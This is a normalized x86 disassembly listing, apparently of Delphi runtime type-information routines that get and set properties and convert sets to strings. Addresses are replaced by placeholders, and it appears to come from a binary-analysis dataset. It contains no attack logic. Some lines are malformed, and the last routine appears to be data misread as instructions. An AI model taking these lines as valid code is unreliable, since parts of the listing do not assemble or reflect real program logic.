mov eax [ ebp - 0x4 ]
call sub_413e48
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax edi
call sub_416e04
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_41723c
jmp r-xdata
push ebp
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
call sub_4160dc
pop ecx
push edx
push eax
mov edx ebx
mov eax edi
call sub_4172dc
jmp r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4148fc
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_416754
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x5 ]
xor edx edx
push edx
push eax
call sub_4160dc
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_416754
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_4160dc
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_416754
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_413dbc
cmp ax 0xb
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_413e04
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_4167d4
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_413e04
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax edi
call sub_416a54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fda4
mov ecx eax
mov edx ebx
mov eax edi
call sub_416754
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_4160dc
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_416754
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4116f4
call sub_4029f8
test edx edx
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_416754
jmp r-xdata
neg eax
adc edx 0x0
neg edx
sub_41640c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416467
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov cl 0x1
mov edx [ ebp + 0x8 ]
call sub_415e70
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f49c
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41646e
lea eax [ ebp - 0x10 ]
call sub_40f188
retn
sub_41647c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_416144
mov al 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4164b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41656e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_4164a4
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_4164a4
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408240
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403fc0
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_40800c
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416575
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407f2c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403fc0
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_4041d0
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_416588
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4165d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4164a4
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_40837c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_416588
mov edx [ rw-data ]
mov eax esi
call sub_40800c
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_40800c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_40837c
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_416638
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4166a8
push ebx
push ecx
mov [ esp ] ecx
call sub_416638
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov eax [ r-xdata ]
cmp eax [ esp ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
cmp al 0x1f
ja r-xdata
jb r-xdata
and eax 0x7f
bt [ esp ] eax
xor ebx ebx
sub_4166e0
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_416754
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4167b0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4166e0
mov edx eax
mov ecx edi
mov eax [ ebx ]
mov eax [ eax ]
call sub_4164b0
pop edi
pop esi
pop ebx
retn
sub_4167d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
mov edx esi
call sub_4165d4
test eax eax
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_416754
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
sub_416824
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_4166e0
mov edx eax
mov ecx ebx
mov eax edi
call sub_416850
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_416850
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_416904
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403f6c
mov eax [ ebp - 0x4 ]
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4164a4
mov eax [ eax + 0x1 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
xor ebx ebx
jae r-xdata
bt edi eax
inc ebx
cmp ebx 0x20
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax ebx
cmp eax 0x1f
ja r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_4164b0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404234
mov eax esi
mov edx r-xdata
call sub_404234
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41690b
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
push r-xdata
push [ esi ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4042ec
sub_416938
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
test al al
je r-xdata
mov eax edx
mov edx [ esi ]
mov ecx ebx
call sub_40405c
jmp r-xdata
sub al 0x20
je r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
sub al 0x20
je r-xdata
sub al 0xc
je r-xdata
inc ebx
sub al 0xc
je r-xdata
sub al 0x31
jne r-xdata
sub al 0x31
je r-xdata
inc ebx
add [ esi ] ebx
pop esi
pop ebx
retn
sub_41697c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416a43
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a4a
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax edi
call sub_40442c
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x20
je r-xdata
inc [ ebp - 0x4 ]
sub al 0x3b
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_4164a4
mov eax [ eax + 0x1 ]
mov edi [ eax ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_416938
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4165d4
mov ebx eax
test ebx ebx
jge r-xdata
cmp ebx 0x1f
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_416938
bts esi ebx
sub_416a54
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx edi
mov eax ebx
call sub_41697c
mov ecx eax
mov edx ebx
mov eax esi
call sub_416754
pop edi
pop esi
pop ebx
retn
sub_416a78
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_416abc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416b38
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404208
mov ecx esp
mov edx esi
mov eax ebx
call sub_416abc
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_416b80
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_416b6c
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_416bc0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_416b6c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416c00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416c48
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_416d1c
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4041f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416c4f
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_416c58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416ca0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047c4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_416e04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ca7
lea eax [ ebp - 0x4 ]
call sub_404678
retn
sub_416cb0
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416b10
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416b80
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_416c00
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403f6c
pop ebx
retn
sub_416cf0
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_416b38
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_416bc0
pop ebx
retn
dec bl
je r-xdata
call sub_416c58
jmp r-xdata
pop ebx
retn
sub_416d1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416df4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_416cb0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4047c4
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416dfb
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4046b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404678
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_416e04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416eca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041f4
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_416cf0
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ed1
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046b4
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_416ed8
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4164a4
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_416f18 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_4164a4
cmp [ eax ] 0x4
jne r-xdata
sub_416ff0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4164a4
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_417038 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_417167 ]
jmp [ eax * 4 + jump_table_4170d4 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4171fc
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_4171e8
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_41723c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4171e8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41727c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4172b4
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4172dc
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_417318
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4059b4
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_41738c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4173d2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173d9
retn
mov eax rw-data
call sub_403f6c
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a20
sub_4176e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_417709
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417710
retn
sub_418230
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
pop esp
outsb
dec ecx
je r-xdata
add al dl
xor [ eax ] eax
